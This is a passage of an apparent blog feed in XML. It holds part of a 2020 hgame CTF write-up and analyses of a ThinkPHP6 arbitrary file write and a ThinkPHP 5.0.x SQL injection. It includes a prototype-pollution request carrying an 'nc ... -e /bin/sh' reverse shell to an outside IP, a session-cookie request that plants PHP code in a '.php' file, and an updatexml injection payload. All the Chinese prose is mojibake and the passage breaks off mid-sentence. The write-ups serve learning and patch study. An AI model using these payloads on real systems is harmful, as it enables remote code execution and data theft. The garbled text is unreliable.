&quot;attack&quot;: 500,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,            &quot;solution&quot;: &quot;æ ¼æŒ¡&quot;        },        {            &quot;method&quot;: &quot;ä¸‹æ®µæ”»å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;è·³è·ƒè¸©å¤´&quot;        },        {            &quot;method&quot;: &quot;çªåˆºæ”»å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;è¯†ç ´&quot;        },        {            &quot;method&quot;: &quot;å·´ä¹‹é›·&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;é›·å&quot;        },    ]    this.getAttackInfo = function () {        return this.attacks[Math.floor(Math.random() * this.attacks.length)]    }</code></pre><p>æ˜¯ä»<code>attacks</code>ä¸­éšæœºæŒ‘ä¸€ä¸ªæ‹¿å‡ºæ¥çš„,è€Œå…¶ä¸­æŸäº›æ˜¯æ²¡æœ‰<code>additionalEffect</code>å±æ€§çš„</p><p>æ ¹æ®jsæ ¹æ®åŸå‹é“¾æ¥æŸ¥æ‰¾å±æ€§çš„ç‰¹æ€§</p><p>æˆ‘ä»¬å¯ä»¥ç”¨åŸå‹é“¾æ±¡æŸ“æ¥ä¿®æ”¹Objectçš„additionalEffectå±æ€§</p><p>payload:</p><pre><code>POST /action HTTP/1.1Host: sekiro.hgame.babelfish.inkContent-Length: 169Pragma: no-cacheCache-Control: no-cacheAccept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36Content-Type: application/json; charset=UTF-8Referer: http://sekiro.hgame.babelfish.ink/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0gConnection: close{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-typeè¦è®¾ç½®æˆ<code>Content-Type: application/json</code></p><p>ä¸ç„¶<code>__proto__</code>æ˜¯æ— æ³•å½“åˆé”®çš„,é‚£ä¹ˆmergeä¹Ÿå°±æ²¡ç”¨äº†</p><p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p><h3 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h3><p>å°±è¯´è¯´å’‹æ‹¿åˆ°å¯†ç çš„</p><p>å‹ç¼©æ–‡ä»¶æç¤º<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p><p>åˆ©ç”¨æœç´¢å¼•æ“(<code>Pixiv@ç´”ç™½å¯æ†</code>)æ‹¿åˆ°å¯†ç </p><h3 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h3><p>è§£å‹å¾—åˆ°ä¸€ä¸ªæ–‡æœ¬å’Œä¸€ä¸ªå‹ç¼©åŒ…</p><p>è§‚å¯Ÿæ–‡æœ¬å’Œå‹ç¼©åŒ…å‘ç°,äºŒè€…çš„CRCå€¼ç›¸åŒ,äºæ˜¯è€ƒè™‘ç”¨æ˜æ–‡æ”»å‡»(ä¸å¥½æ„æ€,æˆ‘æ˜¯çœ‹ç€wikiéå†è¿‡å»çš„)</p><p>ç„¶åæ‹¿åˆ°é‡Œé¢çš„wordæ–‡æ¡£,ä½†æ˜¯æ˜¯åŠ å¯†çš„,çŒ.</p><p>åœ¨çœ‹ä¸€ä¸‹é‚£ä¸ªæ–‡æœ¬,æœ‰ç‚¹åƒåŸ¹æ ¹å¯†ç </p><pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]result=&quot;&quot;for i in range(0,len(s),5):    temp=&quot;&quot;    for j in range(5):        if s[i+j]==s[i+j].lower():            temp+=&quot;0&quot;        else :            temp+=&quot;1&quot;    result+=chr(int(temp,2)+ord(&#39;A&#39;))print(result)</code></pre><p>äºæ˜¯æ‹¿åˆ°å¯†ç (HIDDENINTHEDOC),ä½†æ˜¯è¿˜æ²¡åˆ°å¤´!!!!!ç™¾åº¦ä¸€ä¸‹wordéšå†™,æœ€åæ‹¿åˆ°flag</p><h3 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h3><p>è§£å‹å¾—åˆ°password.txtå’Œok.zip</p><p>æ ¹æ®password.txtçš„æç¤º,æ …æ è§£å¯†+å‡¯æ’’å¯†ç å¾—åˆ°å‹ç¼©åŒ…å¯†ç .</p><p>æ‹¿åˆ°ä¸€å †ookç›´æ¥ä¸Šè°·æ­Œ.okäº†</p><p>base32-&gt;base64-&gt;äºŒç»´ç </p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>ç›´æ¥å¥—è„šæœ¬</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-import gmpy2from secret import A, B, flagassert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher = &#39;&#39;for b in flag:    i = TABLE.find(b)    if i == -1:        cipher += b    else:        ii = (A*i + B) % MOD        cipher += TABLE[ii]print(cipher)# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre><p>æˆ‘ä»¬è§‚å¯Ÿå¯ä»¥å‘ç°è¿™å…¶å®æ˜¯ä¸ªå•è¡¨æ›¿æ¢åŠ å¯†</p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦ç”Ÿæˆç”Ÿæˆä¸€ä¸ªåŠ å¯†è¡¨å°±å¯ä»¥å¾ˆå®¹æ˜“çš„æ±‚å‡ºåŠ å¯†å†…å®¹</p><p>ä½†æ˜¯å”¯ä¸€éº»çƒ¦çš„æ˜¯æˆ‘ä»¬ä¸çŸ¥é“A,B,ä½†æ˜¯æˆ‘ä»¬çŸ¥é“æ˜æ–‡çš„å‰å‡ ä¸ªå­—ç¬¦hgame</p><p>äºæ˜¯æœ‰</p><pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;for A in range(1,MOD):    for B in range(1,MOD):        result=&quot;&quot;        try :            #ç”ŸæˆåŠ å¯†è¡¨            TABLE2={}            for b in TABLE:                i=TABLE.find(b)                TABLE2[TABLE[(A*i + B) % MOD]]=b            #è§£å¯†            for b in cipher:                ii=TABLE.find(b)                if ii==-1:                    result+=b                else :                    result+=TABLE2[b]        except :            pass        if &quot;hgame&quot; in result:            print(result)</code></pre><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>è¿™ä¸ªæ˜¯ä½ç½®ç§»åŠ¨åŠ å¯†,è¾“å…¥ä¸€ä¸ªå’Œflagé•¿åº¦ç›¸åŒçš„å­—ç¬¦ä¸²å°±çŸ¥é“å¦‚ä½•è§£å¯†äº†</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>è¦†ç›–å˜é‡å€¼æ¥æ‰§è¡Œåé—¨å‡½æ•°</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/07/2020hgame/">http://blog.ccreater.top/2020/02/07/2020hgame/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</title>
      <link href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP6-ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"><a href="#ThinkPHP6-ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ" class="headerlink" title="ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"></a>ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ol><li>ThinkPHP6.0.0-6.0.1</li><li>å¼€å¯Sessoinä¸­é—´ä»¶</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>å®˜æ–¹commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p><p>å¤ç°ç¯å¢ƒä¸º:phpstudy+thinkphp6.0.1</p><p><code>\app\controller\index.php</code>:</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;use think\facade\Session;class Index extends BaseController{    public function index($name)    {        Session::set(&#39;name&#39;, $name);        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;    }}</code></pre><p><code>\app\middleware.php</code></p><pre><code class="php">&lt;?php// å…¨å±€ä¸­é—´ä»¶å®šä¹‰æ–‡ä»¶return [    // å…¨å±€è¯·æ±‚ç¼“å­˜    // \think\middleware\CheckRequestCache::class,    // å¤šè¯­è¨€åŠ è½½    // \think\middleware\LoadLangPack::class,//     Sessionåˆå§‹åŒ–     \think\middleware\SessionInit::class];</code></pre><p>æ ¹æ®æ¼æ´çš„ä¿¡æ¯(ä»»æ„æ–‡ä»¶æ“ä½œ),æˆ‘ä»¬ä»<code>vendor\topthink\framework\src\think\session\Store.php</code> çš„<code>save</code>å‡½æ•°å¼€å§‹è¿›è¡Œåˆ†æ</p><pre><code class="php">public function save(): void    {        $this-&gt;clearFlashData();//æ¸…é™¤åŸæ¥çš„æ•°æ®        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>è·Ÿè¿›<code>$this-&gt;handler-&gt;write</code>æ–¹æ³•çœ‹ä¸€ä¸‹</p><pre><code class="php">public function write(string $sessID, string $sessData): bool    {        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {            //æ•°æ®å‹ç¼©            $data = gzcompress($data, 3);        }        return $this-&gt;writeFile($filename, $data);    }</code></pre><p>å†è·Ÿè¿›<code>$this-&gt;writeFile</code></p><pre><code class="php">protected function writeFile($path, $content): bool    {        return (bool) file_put_contents($path, $content, LOCK_EX);    }</code></pre><p>å› ä¸º<code>$data</code>å¯æ§,é‚£ä¹ˆæˆ‘ä»¬åªè¦èƒ½æ§åˆ¶<code>$path</code>æˆ‘ä»¬å°±å¯ä»¥å†™shellè¿›å»äº†</p><p>è€Œ<code>$path</code>ç”±<code>$this-&gt;getFileName($sessID, true);</code>å¾—åˆ°</p><p>è·Ÿè¿›å»</p><pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string    {        if ($this-&gt;config[&#39;prefix&#39;]) {            // ä½¿ç”¨å­ç›®å½•            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;        } else {            $name = &#39;sess_&#39; . $name;        }        $filename = $this-&gt;config[&#39;path&#39;] . $name;        $dir      = dirname($filename);        if ($auto &amp;&amp; !is_dir($dir)) {            try {                mkdir($dir, 0755, true);            } catch (\Exception $e) {                // åˆ›å»ºå¤±è´¥            }        }        return $filename;    }</code></pre><p><code>$filename</code>ç›´æ¥ç”±æœ«ç«¯æ‹¼æ¥å‚æ•°<code>$name</code></p><p>è€Œ<code>write</code>è°ƒç”¨<code>getFileName</code>æ—¶ç›´æ¥å°†å‚æ•°<code>$sessID</code>ä¼ å…¥,<code>$sessID</code>ç”±<code>$sessionId = $this-&gt;getId();</code>è·å¾—</p><pre><code class="php">    public function getId(): string    {        return $this-&gt;id;    }</code></pre><p><code>$this-&gt;id</code>æ—¶é€šè¿‡<code>setId()</code>æ¥è®¾ç½®çš„</p><pre><code class="php">    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>å¦‚æœ<code>is_string($id) &amp;&amp; strlen($id) === 32</code>æ»¡è¶³,åˆ™ç›´æ¥å°†<code>$id</code>çš„å€¼èµ‹ç»™<code>$this-&gt;id</code></p><p>æŸ¥æ‰¾è°ƒç”¨setIdçš„å‡½æ•°</p><p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p><p>å…¶ä¸­<code>SessionInit</code></p><pre><code class="php">    public function handle($request, Closure $next)    {        // Sessionåˆå§‹åŒ–        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);        $cookieName   = $this-&gt;session-&gt;getName();        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {            $sessionId = $request-&gt;request($varSessionId);        } else {            $sessionId = $request-&gt;cookie($cookieName);        }        if ($sessionId) {            $this-&gt;session-&gt;setId($sessionId);        }    }</code></pre><p>æŸ¥æ‰¾é…ç½®å‘ç°<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p><p>å› æ­¤æ„é€ payload</p><pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3ECookie :PHPSESSID=9f7777c08f3909751b148338ba08.phpè®¿é—®http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><pre><code class="php">public function setId($id=null):void{    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());}</code></pre><p>åœ¨<code>setId</code>ä¸­å¢åŠ äº†å¯¹<code>$id</code>çš„æ ¡éªŒ:<code>ctype_alnum($id)</code>,åªå…è®¸æ•°å­—æˆ–å­—æ¯,æ¥é¿å…ä»»æ„æ–‡ä»¶æ“ä½œ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ/](<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHPæ¡†æ¶5.0.x_SQLæ³¨å…¥åˆ†æ</title>
      <link href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHPæ¡†æ¶5-0-x-SQLæ³¨å…¥åˆ†æ-amp-æ•°æ®åº“é…ç½®æ³„éœ²"><a href="#ThinkPHPæ¡†æ¶5-0-x-SQLæ³¨å…¥åˆ†æ-amp-æ•°æ®åº“é…ç½®æ³„éœ²" class="headerlink" title="ThinkPHPæ¡†æ¶5.0.x SQLæ³¨å…¥åˆ†æ &amp; æ•°æ®åº“é…ç½®æ³„éœ²"></a>ThinkPHPæ¡†æ¶5.0.x SQLæ³¨å…¥åˆ†æ &amp; æ•°æ®åº“é…ç½®æ³„éœ²</h1><h2 id="åº”ç”¨èŒƒå›´"><a href="#åº”ç”¨èŒƒå›´" class="headerlink" title="åº”ç”¨èŒƒå›´"></a>åº”ç”¨èŒƒå›´</h2><p>å¼€å¯debugæ¨¡å¼çš„thinkphp5.0.x</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä»å®˜ç½‘ä¸Šä¸‹è½½5.0.9å®Œæ•´ç‰ˆ</p><p><code>application/index/controller/index.php</code>å†…å®¹å¦‚ä¸‹</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\model\Gather;class Index{    public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }}</code></pre><p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æˆ‘ä»¬åœ¨æ¼æ´çš„å…³é”®ä½ç½®ä¸‹ä¸ªæ–­ç‚¹è¿›è¡Œåˆ†æ,<code>thinkphp\library\think\db\Builder.php</code>:383è¡Œ</p><p>è°ƒç”¨å †æ ˆä¸º:</p><p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p><p>ä»index()æ–¹æ³•å¼€å§‹</p><pre><code class="php">public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }</code></pre><p>è°ƒç”¨<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>è¿”å›å€¼çš„select()æ–¹æ³•</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹select()æ–¹æ³•,å®ƒä¼šå°†<code>$option</code>ä½œä¸ºå‚æ•°è°ƒç”¨<code>Builder::select</code>æ–¹æ³•</p><pre><code class="php">public function select($data = null)    {        ...        // åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼        $options = $this-&gt;parseExpress();        ...        if (!$resultSet) {            // ç”ŸæˆæŸ¥è¯¢SQL            $sql = $this-&gt;builder-&gt;select($options);            // è·å–å‚æ•°ç»‘å®š            ...            }            ...    }</code></pre><p>æˆ‘ä»¬è·Ÿè¿›<code>$this-&gt;parseExpress();</code>çœ‹<code>$option</code>æ˜¯å¦‚ä½•ç”Ÿæˆçš„</p><pre><code class="php">protected function parseExpress()    {        $options = $this-&gt;options;        ...    }</code></pre><p>è¿™é‡Œæ˜¯ç›´æ¥ä»¤<code>$options = $this-&gt;options;</code>,è€Œ<code>$this-&gt;options</code>æ˜¯<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>è¿‡ç¨‹ç”Ÿæˆçš„</p><p>è·Ÿè¿›å»å‘ç°æœ‰è¿™ä¸€æ¡è¯­å¥ <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,å…¶ä¸­<code>$where</code>ç”±<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>å¾—åˆ°</p><p>è·å¾—<code>$option</code>çš„è°ƒç”¨é“¾ä¸º:</p><p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p><p>æˆ‘ä»¬å›åˆ°<code>$this-&gt;builder-&gt;select($options);</code>,ç°åœ¨æˆ‘ä»¬çŸ¥é“<code>$this-&gt;options[&#39;where&#39;][$logic]</code>æ˜¯æˆ‘ä»¬çš„å¯æ§ä½ç½®</p><p>è·Ÿè¿›å»</p><pre><code class="php">public function select($options = [])    {        $sql = str_replace(            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],            [                $this-&gt;parseTable($options[&#39;table&#39;], $options),                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),                $this-&gt;parseField($options[&#39;field&#39;], $options),                $this-&gt;parseJoin($options[&#39;join&#39;], $options),                $this-&gt;parseWhere($options[&#39;where&#39;], $options),                $this-&gt;parseGroup($options[&#39;group&#39;]),                $this-&gt;parseHaving($options[&#39;having&#39;]),                $this-&gt;parseOrder($options[&#39;order&#39;], $options),                $this-&gt;parseLimit($options[&#39;limit&#39;]),                $this-&gt;parseUnion($options[&#39;union&#39;]),                $this-&gt;parseLock($options[&#39;lock&#39;]),                $this-&gt;parseComment($options[&#39;comment&#39;]),                $this-&gt;parseForce($options[&#39;force&#39;]),            ], $this-&gt;selectSql);        return $sql;    }</code></pre><p>è¿™ä¸ª<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>åˆ†æ”¯è¿›å…¥äº†å…³é”®çš„æ¼æ´ä½ç½®,æ­¤æ—¶<code>$where</code>å¯æ§</p><pre><code class="php">protected function parseWhere($where, $options)    {        $whereStr = $this-&gt;buildWhere($where, $options);        ...        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;    }</code></pre><p>å†è·Ÿè¿›<code>$this-&gt;buildWhere($where, $options)</code>,æ­¤æ—¶<code>$where</code>å¯æ§</p><pre><code class="php">public function buildWhere($where, $options)    {        if (empty($where)) {            $where = [];        }        if ($where instanceof Query) {            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);        }        $whereStr = &#39;&#39;;        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);        foreach ($where as $key =&gt; $val) {            $str = [];            foreach ($val as $field =&gt; $value) {                ...                    // å¯¹å­—æ®µä½¿ç”¨è¡¨è¾¾å¼æŸ¥è¯¢                    $field = is_string($field) ? $field : &#39;&#39;;                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);            }            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);        }        return $whereStr;    }</code></pre><p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>è¿™ä¸ªç”Ÿæˆäº†sqlè¯­å¥çš„whereéƒ¨åˆ†,å…¶ä¸­<code>$str</code>æ˜¯ç”±<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>ç”Ÿæˆçš„,è€Œå‚æ•°<code>$value[1]</code>å°±æ˜¯æˆ‘ä»¬<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payloadä¸­çš„é”®å€¼</p><p>è·Ÿè¿›<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p><pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)    {        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;        // æŸ¥è¯¢è§„åˆ™å’Œæ¡ä»¶        if (!is_array($val)) {            $val = [&#39;=&#39;, $val];        }        list($exp, $value) = $val;        // å­—æ®µåˆ†æ        if(....){            ...        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {            // IN æŸ¥è¯¢            if ($value instanceof \Closure) {                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);            } else {                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);                if (array_key_exists($field, $binds)) {                    $bind  = [];                    $array = [];                    foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }                    $this-&gt;query-&gt;bind($bind);                    $zone = implode(&#39;,&#39;, $array);                } else {                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));                }                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;            }        }         return $whereStr;    }</code></pre><p>ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>æ¡ä»¶æ»¡è¶³æ—¶,å°†ä¼šç›´æ¥å°†æˆ‘ä»¬payloadä¸­çš„é”®å€¼ç›´æ¥æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</p><pre><code class="php">                foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }</code></pre><p>è€Œ<code>$exp</code>åˆ™ç”±<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>ä¸­çš„<code>&#39;in&#39;</code>ç»è¿‡ä¸€ç³»åˆ—æ“ä½œåå¾—åˆ°</p><p>ä½†æ˜¯è¿™é‡Œåªèƒ½è¿›è¡Œæ²¡æœ‰å­æŸ¥è¯¢è¯­å¥çš„sqlæŠ¥é”™æ³¨å…¥</p><p>å¦‚æœæœ‰å­æŸ¥è¯¢è¯­å¥çš„è¯å°±ä¼šæŠ¥<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are 